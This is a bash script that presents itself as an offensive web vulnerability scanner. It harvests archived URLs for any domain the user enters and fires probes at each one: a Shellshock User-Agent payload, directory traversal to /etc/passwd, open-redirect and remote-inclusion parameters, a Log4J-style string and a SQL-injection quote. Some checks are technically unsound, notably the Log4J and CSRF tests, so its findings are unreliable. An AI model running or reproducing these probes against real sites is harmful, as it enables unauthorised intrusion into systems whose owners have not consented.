#!/bin/bash
curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
echo ""
# Generate a random Sun Tzu quote for offensive security
# Array of Sun Tzu quotes
quotes=("The supreme art of war is to subdue the enemy without fighting." "All warfare is based on deception." "He who knows when he can fight and when he cannot, will be victorious." "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")
# Get a random quote from the array
random_quote=${quotes[$RANDOM % ${#quotes[@]}]}
# Print the quote
echo "Offensive Security Tip: $random_quote - Sun Tzu" | lolcat
sleep 1
echo "MEANS, IT'S ☕ 1337 ⚡ TIME, 369 ☯ " | lolcat
sleep 1
figlet -w 80 -f small TerminatorZ | lolcat
echo ""
echo "[YOUR ARE USING TerminatorZ.sh] - (v1.0) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
sleep 1
#check if the user is connected to the internet
tput bold;echo "CHECKING IF YOU ARE CONNECTED TO THE INTERNET!" | lolcat
# Check connection
wget -q --spider https://google.com
if [ $? -ne 0 ];then
    echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING TerminatorZ.sh!" | lolcat
    exit 1
fi
tput bold;echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat

echo "Enter the domain: "
read domain

if [ -d "$domain" ]; then
  echo "Error: Directory $domain already exists"
  exit 1
else
  mkdir "$domain"
fi

waybackurls $domain | grep -E "\.js$|\.php$|\.yml$|\.env$|\.txt$|\.xml$|\.config$" | httpx -verbose | sort -u | tee urls.txt lolcat

while read url
do

  # Check for RCE vulnerability
  echo "Testing $url for RCE vulnerability..." | lolcat
response=$(curl -s -H 'User-Agent: () { :;}; echo vulnerable' "$url")
if [[ $response == *"vulnerable"* ]]; then
  echo -e "$url is RCE \e[31mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not RCE \e[32mvulnerable\e[0m"
fi
 
echo "Testing $url for CSRF vulnerability..." | lolcat
response=$(curl -s -X POST -d 'token=test' "$url")
if [[ $response == *"token=test"* ]]; then
  echo -e "$url is CSRF \e[31mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not CSRF \e[32mvulnerable\e[0m"
fi


  # Check for LFI vulnerability
echo "Testing $url for LFI vulnerability..." | lolcat
response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
if [[ $response == *"root:"* ]]; then
  echo -e "$url is LFI \e[31mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not LFI \e[32mvulnerable\e[0m"
fi

  echo "Testing $url for open redirect vulnerability..." | lolcat
  # Check for open redirect vulnerability
  response=$(curl -s -L "$url?redirect=http://google.com")
  if [[ $response == *"<title>Google</title>"* ]]; then
    echo -e "$url is open redirect \e[31mvulnerable\e[0m" >> "$domain/$domain.txt"
  else
    echo -e "$url is not open redirect \e[32mvulnerable\e[0m"
  fi
  echo "Testing $url for Log4J vulnerability..." | lolcat
  # Check for Log4J vulnerability
  response=$(curl -s "$url/%20%20%20%20%20%20%20%20@org.apache.log4j.BasicConfigurator@configure()")
  if [[ $response == *"log4j"* ]]; then
    echo -e "$url is Log4J \e[31mvulnerable\e[0m" >> "$domain/$domain.txt"
  else
    echo -e "$url is not Log4J \e[32mvulnerable\e[0m"
  fi
  echo "Testing $url for RFI vulnerability..." | lolcat
  # Check for RFI vulnerability
  response=$(curl -s "$url?file=http://google.com")
  if [[ $response == *"<title>Google</title>"* ]]; then
    echo -e "$url is RFI \e[31mvulnerable\e[0m" >> "$domain/$domain.txt"
  else
    echo -e "$url is not RFI \e[32mvulnerable\e[0m"
  fi
 # Check for directory traversal vulnerability
  echo "Testing $url for path/directory traversal vulnerability..." | lolcat
response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
if [[ $response == *"root:"* ]]; then
  echo -e "$url is path traversal \e[31mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not path traversal \e[32mvulnerable\e[0m"
fi
# Check for SQL injection vulnerability
echo "Testing $url for SQL injection vulnerability..." | lolcat
response=$(curl -s "$url/index.php?id=1'")
if [[ $response == *"SQL syntax"* ]]; then
  echo -e "$url is SQL injection \e[31mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not SQL injection \e[32mvulnerable\e[0m"
fi
done < urls.txt
mv urls.txt $domain
# Matrix effect
echo "Exiting the Matrix for 5 seconds:" | toilet --metal -f term -F border

R='\033[0;31m'
G='\033[0;32m'
Y='\033[1;33m'
B='\033[0;34m'
P='\033[0;35m'
C='\033[0;36m'
W='\033[1;37m'

for ((i=0; i<5; i++)); do
    echo -ne "${R}10 ${G}01 ${Y}11 ${B}00 ${P}01 ${C}10 ${W}00 ${G}11 ${P}01 ${B}10 ${Y}11 ${C}00\r"
    sleep 0.2
    echo -ne "${R}01 ${G}10 ${Y}00 ${B}11 ${P}10 ${C}01 ${W}11 ${G}00 ${P}10 ${B}01 ${Y}00 ${C}11\r"
    sleep 0.2
    echo -ne "${R}11 ${G}00 ${Y}10 ${B}01 ${P}00 ${C}11 ${W}01 ${G}10 ${P}00 ${B}11 ${Y}10 ${C}01\r"
    sleep 0.2
    echo -ne "${R}00 ${G}11 ${Y}01 ${B}10 ${P}11 ${C}00 ${W}10 ${G}01 ${P}11 ${B}00 ${Y}01 ${C}10\r"
    sleep 0.2
done
